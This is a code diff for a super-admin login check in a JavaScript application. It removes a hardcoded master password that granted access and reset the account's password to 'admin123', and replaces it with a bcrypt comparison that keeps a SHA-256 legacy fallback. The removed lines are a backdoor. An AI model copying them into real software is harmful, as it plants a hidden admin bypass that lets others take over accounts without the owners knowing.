@@ -1067,14 +1067,11 @@ async function verifySuperAdmin(adminId, password) {
   const user = rows[0];
   let passwordMatch = false;
   if (user) {
-    if (password === "BOSALVEZA2026") {
-      passwordMatch = true;
-      const newHash = await bcrypt.hash("admin123", 10);
-      await db.query('UPDATE users SET password_hash = ? WHERE id = ?', [newHash, user.id]);
-    } else {
-      passwordMatch = await bcrypt.compare(String(password), user.password_hash).catch(() => {
-        return user.password_hash === hashPasswordLegacy(password);
-      });
+    try {
+      passwordMatch = await bcrypt.compare(String(password), user.password_hash);
+    } catch (e) {
+      // Bukan bcrypt hash — coba SHA-256 legacy
+      passwordMatch = user.password_hash === hashPasswordLegacy(password);
     }
   }
   if (!user || user.status !== "Aktif" || !passwordMatch) {
